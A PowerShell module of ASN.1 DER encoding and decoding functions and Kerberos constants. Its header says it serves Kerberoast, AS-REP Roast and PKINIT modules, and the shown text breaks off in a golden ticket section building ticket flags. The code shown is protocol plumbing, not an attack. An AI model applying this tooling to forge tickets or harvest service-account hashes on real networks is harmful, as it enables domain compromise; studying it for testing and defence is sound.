<#
.SYNOPSIS
    ASN.1 DER Encoder and Decoder for Kerberos protocol structures.

.DESCRIPTION
    Provides comprehensive ASN.1 DER encoding and decoding functions for Kerberos protocol implementation. Used by PKINIT, Kerberoast, and AS-REP Roast modules.

    Supports:
    - Primitive types: INTEGER, OCTET STRING, BIT STRING, BOOLEAN, NULL
    - String types: GeneralString, UTF8String, IA5String, PrintableString
    - Time types: GeneralizedTime, UTCTime
    - Constructed types: SEQUENCE, SET
    - Tagged types: Context-specific, Application, Universal

.NOTES
    Author: Alexander Sturz (@_61106960_)

    References:
    - RFC 4120: The Kerberos Network Authentication Service (V5)
    - RFC 4556: Public Key Cryptography for Initial Authentication in Kerberos (PKINIT)
    - ITU-T X.690: ASN.1 encoding rules (BER, CER, DER)
#>

#region ASN.1 Tag Constants

# Universal class tags (bits 7-6 = 00)
$Script:ASN1_BOOLEAN           = 0x01
$Script:ASN1_INTEGER           = 0x02
$Script:ASN1_BIT_STRING        = 0x03
$Script:ASN1_OCTET_STRING      = 0x04
$Script:ASN1_NULL              = 0x05
$Script:ASN1_OBJECT_IDENTIFIER = 0x06
$Script:ASN1_UTF8_STRING       = 0x0C
$Script:ASN1_SEQUENCE          = 0x30  # Constructed
$Script:ASN1_SET               = 0x31  # Constructed
$Script:ASN1_PRINTABLE_STRING  = 0x13
$Script:ASN1_IA5_STRING        = 0x16
$Script:ASN1_UTC_TIME          = 0x17
$Script:ASN1_GENERALIZED_TIME  = 0x18
$Script:ASN1_GENERAL_STRING    = 0x1B

# Tag class bits (bits 7-6)
$Script:ASN1_CLASS_UNIVERSAL   = 0x00
$Script:ASN1_CLASS_APPLICATION = 0x40
$Script:ASN1_CLASS_CONTEXT     = 0x80
$Script:ASN1_CLASS_PRIVATE     = 0xC0

# Constructed bit (bit 5)
$Script:ASN1_CONSTRUCTED       = 0x20

#endregion

#region ASN.1 Length Encoding/Decoding

<#
.SYNOPSIS
    Encodes length in DER format.
#>
function New-ASN1Length {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [int]$Length
    )

    if ($Length -lt 0) {
        throw "ASN.1 length cannot be negative"
    }

    if ($Length -lt 128) {
        # Short form: single byte
        return [byte[]]@($Length)
    }
    else {
        # Long form: first byte = 0x80 | number of length bytes
        $lengthBytes = [System.Collections.Generic.List[byte]]::new()

        $tempLength = $Length
        while ($tempLength -gt 0) {
            $lengthBytes.Insert(0, [byte]($tempLength -band 0xFF))
            $tempLength = $tempLength -shr 8
        }

        $result = [byte[]]@(0x80 -bor $lengthBytes.Count) + $lengthBytes.ToArray()
        return $result
    }
}

<#
.SYNOPSIS
    Decodes DER length and returns length value and bytes consumed.
#>
function Read-ASN1Length {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$Data,

        [Parameter(Mandatory=$true)]
        [int]$Offset
    )

    if ($Offset -ge $Data.Length) {
        throw "ASN.1 length: offset beyond data"
    }

    $firstByte = $Data[$Offset]

    if ($firstByte -lt 128) {
        # Short form
        return @{
            Length = [int]$firstByte
            BytesConsumed = 1
        }
    }
    elseif ($firstByte -eq 0x80) {
        # Indefinite length (not allowed in DER)
        throw "ASN.1 indefinite length not supported in DER"
    }
    else {
        # Long form
        $numLengthBytes = $firstByte -band 0x7F

        if ($Offset + 1 + $numLengthBytes -gt $Data.Length) {
            throw "ASN.1 length: insufficient data for long form"
        }

        # Use [long] to prevent integer overflow with large ASN.1 structures
        [long]$length = 0
        for ($i = 0; $i -lt $numLengthBytes; $i++) {
            $length = ($length -shl 8) -bor $Data[$Offset + 1 + $i]
        }

        return @{
            Length = $length
            BytesConsumed = 1 + $numLengthBytes
        }
    }
}

#endregion

#region ASN.1 Primitive Encoders

<#
.SYNOPSIS
    Encodes an integer in ASN.1 DER format.
#>
function New-ASN1Integer {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [object]$Value
    )

    $bytes = $null

    if ($Value -is [byte[]]) {
        $bytes = $Value
    }
    elseif ($Value -is [array]) {
        # Handle Object[] arrays like @(5) or @(23) - convert to byte array
        # This is common when calling New-ASN1Integer -Value @(5) in PowerShell
        $bytes = [byte[]]($Value | ForEach-Object { [byte]$_ })
    }
    elseif ($Value -is [int] -or $Value -is [int64] -or $Value -is [uint32] -or $Value -is [uint64]) {
        # Convert to big-endian bytes
        if ($Value -eq 0) {
            $bytes = @(0x00)
        }
        else {
            $tempValue = [uint64]$Value
            $byteList = [System.Collections.Generic.List[byte]]::new()

            while ($tempValue -gt 0) {
                $byteList.Insert(0, [byte]($tempValue -band 0xFF))
                $tempValue = $tempValue -shr 8
            }

            $bytes = $byteList.ToArray()

            # Add leading zero if high bit is set (to keep positive)
            if ($bytes[0] -band 0x80) {
                $bytes = @(0x00) + $bytes
            }
        }
    }
    elseif ($Value -is [System.Numerics.BigInteger]) {
        $bytes = $Value.ToByteArray()
        [Array]::Reverse($bytes)  # .NET uses little-endian

        # Remove leading zeros but keep one if needed for sign
        while ($bytes.Length -gt 1 -and $bytes[0] -eq 0 -and -not ($bytes[1] -band 0x80)) {
            $bytes = [byte[]]$bytes[1..($bytes.Length - 1)]
        }
    }
    else {
        throw "Unsupported integer type: $($Value.GetType().Name)"
    }

    $tag = [byte]$Script:ASN1_INTEGER
    $lengthBytes = New-ASN1Length -Length $bytes.Length

    return [byte[]](@($tag) + $lengthBytes + $bytes)
}

<#
.SYNOPSIS
    Encodes an octet string in ASN.1 DER format.
#>
function New-ASN1OctetString {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$false)]
        [byte[]]$Value = @()
    )

    # Handle null or empty array
    if ($null -eq $Value) { $Value = @() }

    $tag = [byte]$Script:ASN1_OCTET_STRING
    $lengthBytes = New-ASN1Length -Length $Value.Length

    if ($Value.Length -eq 0) {
        return [byte[]](@($tag) + $lengthBytes)
    }
    return [byte[]](@($tag) + $lengthBytes + $Value)
}

<#
.SYNOPSIS
    Encodes a bit string in ASN.1 DER format.
#>
function New-ASN1BitString {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$Value,

        [Parameter(Mandatory=$false)]
        [int]$UnusedBits = 0
    )

    if ($UnusedBits -lt 0 -or $UnusedBits -gt 7) {
        throw "UnusedBits must be 0-7"
    }

    $tag = [byte]$Script:ASN1_BIT_STRING
    $content = @([byte]$UnusedBits) + $Value
    $lengthBytes = New-ASN1Length -Length $content.Length

    return [byte[]](@($tag) + $lengthBytes + $content)
}

<#
.SYNOPSIS
    Encodes a boolean in ASN.1 DER format.
#>
function New-ASN1Boolean {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [bool]$Value
    )

    $tag = [byte]$Script:ASN1_BOOLEAN
    $content = if ($Value) { 0xFF } else { 0x00 }

    return [byte[]]@($tag, 0x01, $content)
}

<#
.SYNOPSIS
    Encodes NULL in ASN.1 DER format.
#>
function New-ASN1Null {
    return [byte[]]@($Script:ASN1_NULL, 0x00)
}

<#
.SYNOPSIS
    Encodes an OID in ASN.1 DER format.
#>
function New-ASN1ObjectIdentifier {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$OID
    )

    $components = $OID.Split('.') | ForEach-Object { [int]$_ }

    if ($components.Count -lt 2) {
        throw "OID must have at least 2 components"
    }

    $bytes = [System.Collections.Generic.List[byte]]::new()

    # First two components are encoded as (c1 * 40) + c2
    $bytes.Add([byte](($components[0] * 40) + $components[1]))

    # Remaining components use base-128 encoding
    for ($i = 2; $i -lt $components.Count; $i++) {
        $value = $components[$i]

        if ($value -eq 0) {
            $bytes.Add(0x00)
        }
        else {
            $encoded = [System.Collections.Generic.List[byte]]::new()

            while ($value -gt 0) {
                $encoded.Insert(0, [byte](($value -band 0x7F) -bor 0x80))
                $value = $value -shr 7
            }

            # Clear high bit on last byte
            $encoded[$encoded.Count - 1] = $encoded[$encoded.Count - 1] -band 0x7F
            $bytes.AddRange($encoded)
        }
    }

    $tag = [byte]$Script:ASN1_OBJECT_IDENTIFIER
    $lengthBytes = New-ASN1Length -Length $bytes.Count

    return [byte[]](@($tag) + $lengthBytes + $bytes.ToArray())
}

#endregion

#region ASN.1 String Encoders

<#
.SYNOPSIS
    Encodes a GeneralString in ASN.1 DER format.
#>
function New-ASN1GeneralString {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$Value
    )

    $bytes = [System.Text.Encoding]::ASCII.GetBytes($Value)
    $tag = [byte]$Script:ASN1_GENERAL_STRING
    $lengthBytes = New-ASN1Length -Length $bytes.Length

    return [byte[]](@($tag) + $lengthBytes + $bytes)
}

<#
.SYNOPSIS
    Encodes a UTF8String in ASN.1 DER format.
#>
function New-ASN1UTF8String {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$Value
    )

    $bytes = [System.Text.Encoding]::UTF8.GetBytes($Value)
    $tag = [byte]$Script:ASN1_UTF8_STRING
    $lengthBytes = New-ASN1Length -Length $bytes.Length

    return [byte[]](@($tag) + $lengthBytes + $bytes)
}

<#
.SYNOPSIS
    Encodes an IA5String in ASN.1 DER format.
#>
function New-ASN1IA5String {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$Value
    )

    $bytes = [System.Text.Encoding]::ASCII.GetBytes($Value)
    $tag = [byte]$Script:ASN1_IA5_STRING
    $lengthBytes = New-ASN1Length -Length $bytes.Length

    return [byte[]](@($tag) + $lengthBytes + $bytes)
}

<#
.SYNOPSIS
    Encodes a PrintableString in ASN.1 DER format.
#>
function New-ASN1PrintableString {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$Value
    )

    $bytes = [System.Text.Encoding]::ASCII.GetBytes($Value)
    $tag = [byte]$Script:ASN1_PRINTABLE_STRING
    $lengthBytes = New-ASN1Length -Length $bytes.Length

    return [byte[]](@($tag) + $lengthBytes + $bytes)
}

#endregion

#region ASN.1 Time Encoders

<#
.SYNOPSIS
    Encodes a GeneralizedTime in ASN.1 DER format.
#>
function New-ASN1GeneralizedTime {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [datetime]$Value
    )

    # Format: YYYYMMDDHHMMSSZ
    $timeString = $Value.ToUniversalTime().ToString("yyyyMMddHHmmss") + "Z"
    $bytes = [System.Text.Encoding]::ASCII.GetBytes($timeString)
    $tag = [byte]$Script:ASN1_GENERALIZED_TIME
    $lengthBytes = New-ASN1Length -Length $bytes.Length

    return [byte[]](@($tag) + $lengthBytes + $bytes)
}

<#
.SYNOPSIS
    Encodes a UTCTime in ASN.1 DER format.
#>
function New-ASN1UTCTime {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [datetime]$Value
    )

    # Format: YYMMDDHHMMSSZ
    $timeString = $Value.ToUniversalTime().ToString("yyMMddHHmmss") + "Z"
    $bytes = [System.Text.Encoding]::ASCII.GetBytes($timeString)
    $tag = [byte]$Script:ASN1_UTC_TIME
    $lengthBytes = New-ASN1Length -Length $bytes.Length

    return [byte[]](@($tag) + $lengthBytes + $bytes)
}

#endregion

#region ASN.1 Constructed Type Encoders

<#
.SYNOPSIS
    Encodes a SEQUENCE in ASN.1 DER format.
#>
function New-ASN1Sequence {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        $Data  # Accept any array type, convert to byte[] internally
    )

    # Force conversion to byte[] - handles Object[] from PowerShell array concatenation
    $dataBytes = [byte[]]$Data

    $tag = [byte]$Script:ASN1_SEQUENCE
    $lengthBytes = New-ASN1Length -Length $dataBytes.Length

    $result = New-Object System.Collections.Generic.List[byte]
    $result.Add($tag)
    $result.AddRange([byte[]]$lengthBytes)
    $result.AddRange($dataBytes)
    return [byte[]]$result.ToArray()
}

<#
.SYNOPSIS
    Encodes a SET in ASN.1 DER format.
#>
function New-ASN1Set {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        $Data  # Accept any array type, convert to byte[] internally
    )

    # Force conversion to byte[] - handles Object[] from PowerShell array concatenation
    $dataBytes = [byte[]]$Data

    $tag = [byte]$Script:ASN1_SET
    $lengthBytes = New-ASN1Length -Length $dataBytes.Length

    $result = New-Object System.Collections.Generic.List[byte]
    $result.Add($tag)
    $result.AddRange([byte[]]$lengthBytes)
    $result.AddRange($dataBytes)
    return [byte[]]$result.ToArray()
}

#endregion

#region ASN.1 Tagged Type Encoders

<#
.SYNOPSIS
    Encodes data with a context-specific tag (EXPLICIT).
#>
function New-ASN1ContextTag {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [int]$Tag,

        [Parameter(Mandatory=$true)]
        $Data,  # Accept any array type, convert to byte[] internally

        [Parameter(Mandatory=$false)]
        [switch]$Implicit
    )

    # Force conversion to byte[] - handles Object[] from PowerShell array concatenation
    $dataBytes = [byte[]]$Data

    if ($Tag -lt 0 -or $Tag -gt 30) {
        throw "Context tag must be 0-30 for short form"
    }

    $tagByte = [byte]($Script:ASN1_CLASS_CONTEXT -bor $Tag)

    if (-not $Implicit) {
        # Explicit: constructed (wraps content)
        $tagByte = $tagByte -bor $Script:ASN1_CONSTRUCTED
    }

    $lengthBytes = New-ASN1Length -Length $dataBytes.Length

    $result = New-Object System.Collections.Generic.List[byte]
    $result.Add($tagByte)
    $result.AddRange([byte[]]$lengthBytes)
    $result.AddRange($dataBytes)
    return [byte[]]$result.ToArray()
}

<#
.SYNOPSIS
    Encodes data with an application tag.
#>
function New-ASN1ApplicationTag {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [int]$Tag,

        [Parameter(Mandatory=$true)]
        $Data  # Accept any array type, convert to byte[] internally
    )

    # Force conversion to byte[] - handles Object[] from PowerShell array concatenation
    $dataBytes = [byte[]]$Data

    if ($Tag -lt 0 -or $Tag -gt 30) {
        throw "Application tag must be 0-30 for short form"
    }

    # Application tags are typically constructed
    $tagByte = [byte]($Script:ASN1_CLASS_APPLICATION -bor $Script:ASN1_CONSTRUCTED -bor $Tag)
    $lengthBytes = New-ASN1Length -Length $dataBytes.Length

    $result = New-Object System.Collections.Generic.List[byte]
    $result.Add($tagByte)
    $result.AddRange([byte[]]$lengthBytes)
    $result.AddRange($dataBytes)
    return [byte[]]$result.ToArray()
}

#endregion

#region ASN.1 Decoders

<#
.SYNOPSIS
    Reads and parses an ASN.1 TLV (Tag-Length-Value) structure.
#>
function Read-ASN1Element {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$Data,

        [Parameter(Mandatory=$false)]
        [int]$Offset = 0
    )

    if ($Offset -ge $Data.Length) {
        throw "ASN.1 read: offset beyond data"
    }

    $startOffset = $Offset

    # Read tag
    $tag = $Data[$Offset]
    $Offset++

    # Determine tag class and construction
    $tagClass = $tag -band 0xC0
    $isConstructed = ($tag -band 0x20) -ne 0
    $tagNumber = $tag -band 0x1F

    # Handle long-form tags (tag number = 31)
    if ($tagNumber -eq 0x1F) {
        $tagNumber = 0
        do {
            if ($Offset -ge $Data.Length) {
                throw "ASN.1 read: incomplete long-form tag"
            }
            $tagByte = $Data[$Offset]
            $tagNumber = ($tagNumber -shl 7) -bor ($tagByte -band 0x7F)
            $Offset++
        } while ($tagByte -band 0x80)
    }

    # Read length
    $lengthInfo = Read-ASN1Length -Data $Data -Offset $Offset
    $contentLength = $lengthInfo.Length
    $Offset += $lengthInfo.BytesConsumed

    # Extract content
    if ($Offset + $contentLength -gt $Data.Length) {
        throw "ASN.1 read: content extends beyond data (offset=$Offset, length=$contentLength, data.length=$($Data.Length))"
    }

    $content = if ($contentLength -gt 0) {
        $Data[$Offset..($Offset + $contentLength - 1)]
    } else {
        @()
    }

    $totalLength = ($Offset - $startOffset) + $contentLength

    return [PSCustomObject]@{
        Tag = $tag
        TagClass = $tagClass
        TagNumber = $tagNumber
        IsConstructed = $isConstructed
        ContentLength = $contentLength
        Content = [byte[]]$content
        TotalLength = $totalLength
        HeaderLength = $Offset - $startOffset
    }
}

<#
.SYNOPSIS
    Parses all elements in a constructed ASN.1 structure.
#>
function Read-ASN1Children {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$Data
    )

    $children = [System.Collections.Generic.List[PSCustomObject]]::new()
    $offset = 0

    while ($offset -lt $Data.Length) {
        $element = Read-ASN1Element -Data $Data -Offset $offset
        $children.Add($element)
        $offset += $element.TotalLength
    }

    # Use Write-Output -NoEnumerate to prevent PowerShell from unwrapping
    # single-element arrays (classic PS gotcha: function returns scalar instead of array)
    Write-Output -NoEnumerate $children.ToArray()
}

<#
.SYNOPSIS
    Decodes an ASN.1 INTEGER to a numeric value or BigInteger.
#>
function Read-ASN1Integer {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$Content
    )

    # DER specification does not allow empty INTEGER content
    if ($Content.Length -eq 0) {
        throw "Invalid ASN.1 INTEGER: content cannot be empty"
    }

    # For small integers, return as int64
    if ($Content.Length -le 8) {
        $value = [int64]0
        $isNegative = ($Content[0] -band 0x80) -ne 0

        foreach ($byte in $Content) {
            $value = ($value -shl 8) -bor $byte
        }

        # Handle negative numbers (two's complement)
        if ($isNegative) {
            $mask = [int64]::MaxValue -shr ((8 - $Content.Length) * 8)
            $value = $value -bor (-bnot $mask)
        }

        return $value
    }
    else {
        # For large integers, return as BigInteger
        $bytes = $Content.Clone()
        [Array]::Reverse($bytes)  # BigInteger expects little-endian
        return [System.Numerics.BigInteger]::new($bytes)
    }
}

<#
.SYNOPSIS
    Decodes an ASN.1 BIT STRING.
#>
function Read-ASN1BitString {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$Content
    )

    if ($Content.Length -eq 0) {
        return @{
            UnusedBits = 0
            Data = @()
        }
    }

    # Validate UnusedBits per DER specification (must be 0-7)
    $unusedBits = [int]$Content[0]
    if ($unusedBits -gt 7) {
        throw "Invalid BIT STRING: unused bits must be 0-7, got $unusedBits"
    }

    return @{
        UnusedBits = $unusedBits
        Data = if ($Content.Length -gt 1) { $Content[1..($Content.Length - 1)] } else { @() }
    }
}

<#
.SYNOPSIS
    Decodes an ASN.1 OID to string format.
#>
function Read-ASN1ObjectIdentifier {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$Content
    )

    if ($Content.Length -eq 0) {
        return ""
    }

    $components = [System.Collections.Generic.List[int]]::new()

    # First byte encodes first two components
    $components.Add([int]($Content[0] / 40))
    $components.Add([int]($Content[0] % 40))

    # Remaining bytes use base-128 encoding
    # Use [long] to prevent integer overflow with large OID components
    [long]$value = 0
    for ($i = 1; $i -lt $Content.Length; $i++) {
        $byte = $Content[$i]
        $value = ($value -shl 7) -bor ($byte -band 0x7F)

        if (-not ($byte -band 0x80)) {
            $components.Add($value)
            $value = 0
        }
    }

    return $components -join '.'
}

<#
.SYNOPSIS
    Decodes an ASN.1 GeneralizedTime to DateTime.
#>
function Read-ASN1GeneralizedTime {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$Content
    )

    $timeString = [System.Text.Encoding]::ASCII.GetString($Content)

    # Remove trailing 'Z'
    $timeString = $timeString.TrimEnd('Z')

    # Parse YYYYMMDDHHMMSS
    if ($timeString.Length -ge 14) {
        $year = [int]$timeString.Substring(0, 4)
        $month = [int]$timeString.Substring(4, 2)
        $day = [int]$timeString.Substring(6, 2)
        $hour = [int]$timeString.Substring(8, 2)
        $minute = [int]$timeString.Substring(10, 2)
        $second = [int]$timeString.Substring(12, 2)

        return [datetime]::new($year, $month, $day, $hour, $minute, $second, [System.DateTimeKind]::Utc)
    }

    throw "Invalid GeneralizedTime format: $timeString"
}

<#
.SYNOPSIS
    Decodes an ASN.1 string (GeneralString, UTF8String, etc.).
#>
function Read-ASN1String {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$Content,

        [Parameter(Mandatory=$false)]
        [string]$Encoding = "ASCII"
    )

    switch ($Encoding) {
        "UTF8" { return [System.Text.Encoding]::UTF8.GetString($Content) }
        "Unicode" { return [System.Text.Encoding]::Unicode.GetString($Content) }
        default { return [System.Text.Encoding]::ASCII.GetString($Content) }
    }
}

#endregion

#region Kerberos-Specific ASN.1 Helpers

<#
.SYNOPSIS
    Creates a Kerberos PrincipalName structure.
#>
function New-KerberosPrincipalName {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [int]$NameType,

        [Parameter(Mandatory=$true)]
        [string[]]$NameStrings
    )

    # name-type [0] Int32
    $nameTypeASN = New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value $NameType)

    # name-string [1] SEQUENCE OF GeneralString
    $nameStringsData = @()
    foreach ($name in $NameStrings) {
        $nameStringsData += New-ASN1GeneralString -Value $name
    }
    $nameStringSeq = New-ASN1Sequence -Data $nameStringsData
    $nameStringASN = New-ASN1ContextTag -Tag 1 -Data $nameStringSeq

    return New-ASN1Sequence -Data ($nameTypeASN + $nameStringASN)
}

<#
.SYNOPSIS
    Creates a Kerberos EncryptedData structure.
#>
function New-KerberosEncryptedData {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [int]$EType,

        [Parameter(Mandatory=$false)]
        [int]$Kvno,

        [Parameter(Mandatory=$true)]
        [byte[]]$Cipher
    )

    # etype [0] Int32
    $etypeASN = New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value $EType)

    $data = $etypeASN

    # kvno [1] UInt32 OPTIONAL
    if ($PSBoundParameters.ContainsKey('Kvno')) {
        $kvnoASN = New-ASN1ContextTag -Tag 1 -Data (New-ASN1Integer -Value $Kvno)
        $data += $kvnoASN
    }

    # cipher [2] OCTET STRING
    $cipherASN = New-ASN1ContextTag -Tag 2 -Data (New-ASN1OctetString -Value $Cipher)
    $data += $cipherASN

    return New-ASN1Sequence -Data $data
}

<#
.SYNOPSIS
    Creates a Kerberos PA-DATA structure.
#>
function New-KerberosPAData {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [int]$PADataType,

        [Parameter(Mandatory=$true)]
        [byte[]]$PADataValue
    )

    # padata-type [1] Int32
    $typeASN = New-ASN1ContextTag -Tag 1 -Data (New-ASN1Integer -Value $PADataType)

    # padata-value [2] OCTET STRING
    $valueASN = New-ASN1ContextTag -Tag 2 -Data (New-ASN1OctetString -Value $PADataValue)

    return New-ASN1Sequence -Data ($typeASN + $valueASN)
}

<#
.SYNOPSIS
    Creates Kerberos KDC-Options as BIT STRING.
#>
function New-KerberosKDCOptions {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$false)]
        [switch]$Forwardable,

        [Parameter(Mandatory=$false)]
        [switch]$Forwarded,

        [Parameter(Mandatory=$false)]
        [switch]$Proxiable,

        [Parameter(Mandatory=$false)]
        [switch]$Proxy,

        [Parameter(Mandatory=$false)]
        [switch]$AllowPostdate,

        [Parameter(Mandatory=$false)]
        [switch]$Postdated,

        [Parameter(Mandatory=$false)]
        [switch]$Renewable,

        [Parameter(Mandatory=$false)]
        [switch]$Canonicalize,

        [Parameter(Mandatory=$false)]
        [switch]$RenewableOK,

        [Parameter(Mandatory=$false)]
        [switch]$EncTktInSkey,

        [Parameter(Mandatory=$false)]
        [switch]$CnameInAddlTkt,

        [Parameter(Mandatory=$false)]
        [switch]$DisableTransitedCheck
    )

    # KDC Options is a 32-bit field (4 bytes)
    $options = [uint32]0

    # Bit positions (from RFC 4120)
    if ($Forwardable)           { $options = $options -bor 0x40000000 }  # bit 1
    if ($Forwarded)             { $options = $options -bor 0x20000000 }  # bit 2
    if ($Proxiable)             { $options = $options -bor 0x10000000 }  # bit 3
    if ($Proxy)                 { $options = $options -bor 0x08000000 }  # bit 4
    if ($AllowPostdate)         { $options = $options -bor 0x04000000 }  # bit 5
    if ($Postdated)             { $options = $options -bor 0x02000000 }  # bit 6
    if ($Renewable)             { $options = $options -bor 0x00800000 }  # bit 8
    if ($Canonicalize)          { $options = $options -bor 0x00010000 }  # bit 15
    if ($CnameInAddlTkt)        { $options = $options -bor 0x00020000 }  # bit 14
    if ($RenewableOK)           { $options = $options -bor 0x00000010 }  # bit 27
    if ($EncTktInSkey)          { $options = $options -bor 0x00000008 }  # bit 28
    if ($DisableTransitedCheck) { $options = $options -bor 0x00000020 }  # bit 26

    # Convert to big-endian bytes
    $optionBytes = [System.BitConverter]::GetBytes($options)
    [Array]::Reverse($optionBytes)

    # BIT STRING with 0 unused bits
    return New-ASN1BitString -Value $optionBytes -UnusedBits 0
}

#endregion

#region Kerberos Constants

# Kerberos message types
$Script:KRB_AS_REQ  = 10
$Script:KRB_AS_REP  = 11
$Script:KRB_TGS_REQ = 12
$Script:KRB_TGS_REP = 13
$Script:KRB_AP_REQ  = 14
$Script:KRB_AP_REP  = 15
$Script:KRB_ERROR   = 30

# Principal name types
$Script:NT_UNKNOWN        = 0
$Script:NT_PRINCIPAL      = 1
$Script:NT_SRV_INST       = 2
$Script:NT_SRV_HST        = 3
$Script:NT_SRV_XHST       = 4
$Script:NT_UID            = 5
$Script:NT_X500_PRINCIPAL = 6
$Script:NT_SMTP_NAME      = 7
$Script:NT_ENTERPRISE     = 10

# Encryption types
$Script:ETYPE_DES_CBC_CRC            = 1
$Script:ETYPE_DES_CBC_MD4            = 2
$Script:ETYPE_DES_CBC_MD5            = 3
$Script:ETYPE_RC4_HMAC               = 23
$Script:ETYPE_RC4_HMAC_EXP           = 24
$Script:ETYPE_AES128_CTS_HMAC_SHA1   = 17
$Script:ETYPE_AES256_CTS_HMAC_SHA1   = 18

# PA-DATA types
$Script:PA_TGS_REQ           = 1
$Script:PA_ENC_TIMESTAMP     = 2
$Script:PA_PK_AS_REQ         = 16
$Script:PA_PK_AS_REP         = 17
$Script:PA_ETYPE_INFO        = 11
$Script:PA_ETYPE_INFO2       = 19
$Script:PA_PAC_REQUEST       = 128
$Script:PA_FOR_USER          = 129
$Script:PA_PAC_OPTIONS       = 167

# AuthorizationData AD-TYPE values (RFC 4120)
$Script:AD_IF_RELEVANT = 1              # AuthorizationData is relevant to the application
$Script:AD_INTENDED_FOR_SERVER = 2      # Intended for specific server
$Script:AD_INTENDED_FOR_APP_CLASS = 3   # Intended for application class
$Script:AD_KDC_ISSUED = 4               # KDC-issued data
$Script:AD_AND_OR = 5                   # Conjunctive or disjunctive
$Script:AD_MANDATORY_TICKET_EXTENSIONS = 6
$Script:AD_IN_TICKET_EXTENSIONS = 7
$Script:AD_MANDATORY_FOR_KDC = 8
$Script:AD_WIN2K_PAC = 128              # Windows PAC (Privilege Attribute Certificate)

# Ticket Flags (RFC 4120 Section 5.3) - bit positions (MSB=bit 0)
$Script:TKT_FLAG_RESERVED = 0
$Script:TKT_FLAG_FORWARDABLE = 1
$Script:TKT_FLAG_FORWARDED = 2
$Script:TKT_FLAG_PROXIABLE = 3
$Script:TKT_FLAG_PROXY = 4
$Script:TKT_FLAG_MAY_POSTDATE = 5
$Script:TKT_FLAG_POSTDATED = 6
$Script:TKT_FLAG_INVALID = 7
$Script:TKT_FLAG_RENEWABLE = 8
$Script:TKT_FLAG_INITIAL = 9
$Script:TKT_FLAG_PRE_AUTHENT = 10
$Script:TKT_FLAG_HW_AUTHENT = 11
$Script:TKT_FLAG_TRANSITED_POLICY_CHECKED = 12
$Script:TKT_FLAG_OK_AS_DELEGATE = 13
$Script:TKT_FLAG_ANONYMOUS = 14
$Script:TKT_FLAG_NAME_CANONICALIZE = 15
$Script:TKT_FLAG_ENC_PA_REP = 16

#endregion

#region Golden Ticket ASN.1 Structures

<#
.SYNOPSIS
    Creates TicketFlags BIT STRING from flag switches.
.DESCRIPTION
    Converts ticket flag parameters to the 32-bit BIT STRING format used in Kerberos tickets.
    Default flags for a TGT: Forwardable, Renewable, Initial, Pre-Authent.
#>
function New-TicketFlags {
    [CmdletBinding()]
    param(
        [switch]$Forwardable,
        [switch]$Forwarded,
        [switch]$Proxiable,
        [switch]$Proxy,
        [switch]$MayPostdate,
        [switch]$Postdated,
        [switch]$Invalid,
        [switch]$Renewable,
        [switch]$Initial,
        [switch]$PreAuthent,
        [switch]$HwAuthent,
        [switch]$TransitedPolicyChecked,
        [switch]$OkAsDelegate,
        [switch]$Anonymous,
        [switch]$NameCanonicalize,
        [switch]$EncPaRep,
        [byte[]]$RawFlags  # Alternative: pass 4 bytes directly
    )

    if ($RawFlags -and $RawFlags.Length -eq 4) {
        return $RawFlags
    }

    # Build 32-bit flags (big-endian, MSB = bit 0)
    [uint32]$flags = 0

    if ($Forwardable)             { $flags = $flags -bor (1 -shl (31 - $Script:TKT_FLAG_FORWARDABLE)) }
    if ($Forwarded)               { $flags = $flags -bor (1 -shl (31 - $Script:TKT_FLAG_FORWARDED)) }
    if ($Proxiable)               { $flags = $flags -bor (1 -shl (31 - $Script:TKT_FLAG_PROXIABLE)) }
    if ($Proxy)                   { $flags = $flags -bor (1 -shl (31 - $Script:TKT_FLAG_PROXY)) }
    if ($MayPostdate)             { $flags = $flags -bor (1 -shl (31 - $Script:TKT_FLAG_MAY_POSTDATE)) }
    if ($Postdated)               { $flags = $flags -bor (1 -shl (31 - $Script:TKT_FLAG_POSTDATED)) }
    if ($Invalid)                 { $flags = $flags -bor (1 -shl (31 - $Script:TKT_FLAG_INVALID)) }
    if ($Renewable)               { $flags = $flags -bor (1 -shl (31 - $Script:TKT_FLAG_RENEWABLE)) }
    if ($Initial)                 { $flags = $flags -bor (1 -shl (31 - $Script:TKT_FLAG_INITIAL)) }
    if ($PreAuthent)              { $flags = $flags -bor (1 -shl (31 - $Script:TKT_FLAG_PRE_AUTHENT)) }
    if ($HwAuthent)               { $flags = $flags -bor (1 -shl (31 - $Script:TKT_FLAG_HW_AUTHENT)) }
